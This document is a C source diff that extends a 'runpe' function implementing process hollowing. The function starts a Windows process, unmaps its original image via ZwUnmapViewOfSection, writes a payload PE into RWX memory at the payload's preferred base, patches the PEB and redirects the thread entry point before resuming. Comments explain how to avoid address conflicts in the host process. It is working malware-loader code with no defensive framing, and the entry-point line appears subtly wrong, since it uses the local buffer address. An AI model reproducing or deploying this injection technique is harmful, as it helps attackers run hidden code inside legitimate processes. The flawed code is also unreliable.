@@ -47,13 +47,79 @@ runpe(PBYTE* pe_image)
     return -2;
   }
 
+  CONTEXT thread_ctx;
+  libc_memset(&thread_ctx, 0, sizeof thread_ctx);
+
+  thread_ctx.ContextFlags = CONTEXT_FULL;
+
+  if (!GetThreadContext(proc_info.hThread, &thread_ctx)) {
+    ret = -3;
+    goto kill_process;
+  }
+
+  PVOID p_remote_base;
+
+  if (!ReadProcessMemory(
+        proc_info.hProcess,
+        /*
+          Ebx is the foreign process PEB structure address.
+
+          We want to access the ImageBaseAddress field.
+          Before that field there is 3 BOOLEAN types,
+          a BOOLEAN sized union, and an HANDLE.
+
+          see: http://bytepointer.com/resources/tebpeb32.htm
+        */
+
+        (PVOID)(thread_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE))),
+        &p_remote_base,
+        sizeof p_remote_base,
+        NULL)) {
+    ret = -4;
+    goto kill_process;
+  }
+
+  ZwUnmapViewOfSection* fZwUnmapViewOfSection =
+    get_export_address(get_module_base(L"ntdll.dll"), "ZwUnmapViewOfSection");
+
+  fZwUnmapViewOfSection(proc_info.hProcess, p_remote_base);
+
+  /*
+    We are allocating at the base address the image wants to run at
+    without rebasing it with it's relocation directory if it has one.
+
+    This means that if the base address the image wants to run at is
+    already taken, then we will have a conflict.
+
+    To ensure that there is never a conflict, we can ensure that the
+    started process (executable that shellcode is ran by), has an equal or
+    greater NT_HDR->OptionalHeader.SizeOfImage, and identical
+    NT_HDR->OptionalHeader.ImageBase header as the image we are loading.
+
+    If we unmap the main module of the started process, then there is enough
+    space for the image we are loading to be written.
+
+    A good way to increase NT_HDR->OptionalHeader.SizeOfImage is to
+    add a section with a VirtualSize corresponding to how much we want
+    to increase, without corresponding data in the file (PointerToRawData as
+    0), an uninitialized data section (.bss).
+
+    In practice, it is the best solution to the address conflict problem.
+    It is not possible to perform image rebasing if the process that we start
+    does not itself, have a relocation directory.
+
+    We can of course, detect what the started process has, and make a choice.
+    This is considered future work.
+    There will be some cases where it will not be possible to load the image.
+  */
+
   PBYTE p_mapped = VirtualAllocEx(proc_info.hProcess,
-                                  NULL,
+                                  (PVOID)p_nt->OptionalHeader.ImageBase,
                                   p_nt->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
   if (p_mapped == NULL) {
-    ret = -3;
+    ret = -5;
     goto kill_process;
   }
 
@@ -62,7 +128,7 @@ runpe(PBYTE* pe_image)
                           pe_image,
                           p_nt->OptionalHeader.SizeOfHeaders,
                           NULL)) {
-    ret = -4;
+    ret = -6;
     goto kill_process;
   }
   for (size_t i = 0; i < p_nt->FileHeader.NumberOfSections; ++i) {
@@ -71,36 +137,43 @@ runpe(PBYTE* pe_image)
                             pe_image + p_sections[i].PointerToRawData,
                             p_sections[i].SizeOfRawData,
                             NULL)) {
-      ret = -5;
+      ret = -7;
       goto kill_process;
     }
   }
 
-  CONTEXT thrd_ctx;
-  libc_memset(&thrd_ctx, 0, sizeof thrd_ctx);
+  /*
+    TODO: Figure out protection flags and set them on the mapped image sections.
+  */
 
-  thrd_ctx.ContextFlags = CONTEXT_FULL;
+  if (!WriteProcessMemory(
+        proc_info.hProcess,
+        /*
+          Ebx is the foreign process PEB structure address.
 
-  if (!GetThreadContext(proc_info.hThread, &thrd_ctx)) {
-    ret = -6;
+          We want to access the ImageBaseAddress field.
+          Before that field there is 3 BOOLEAN types,
+          a BOOLEAN sized union, and an HANDLE.
+
+          see: http://bytepointer.com/resources/tebpeb32.htm
+        */
+        (PVOID)(thread_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE))),
+        &p_mapped,
+        sizeof p_mapped,
+        NULL)) {
+    ret = -8;
     goto kill_process;
   }
 
-  if (!WriteProcessMemory(proc_info.hProcess,
-                          /*
-                            Ebx is the foreign process PEB structure address.
+  thread_ctx.Eax = (DWORD)(pe_image + p_nt->OptionalHeader.AddressOfEntryPoint);
 
-                            We want to access the ImageBaseAddress field.
-                            Before that field there is 3 BOOLEAN types,
-                            a BOOLEAN sized union, and an HANDLE.
+  if (!SetThreadContext(proc_info.hThread, &thread_ctx)) {
+    ret = -9;
+    goto kill_process;
+  }
 
-                            see: http://bytepointer.com/resources/tebpeb32.htm
-                          */
-                          thrd_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE)),
-                          &p_mapped,
-                          sizeof p_mapped,
-                          NULL)) {
-    ret = -7;
+  if (!ResumeThread(proc_info.hThread)) {
+    ret = -10;
     goto kill_process;
   }
 
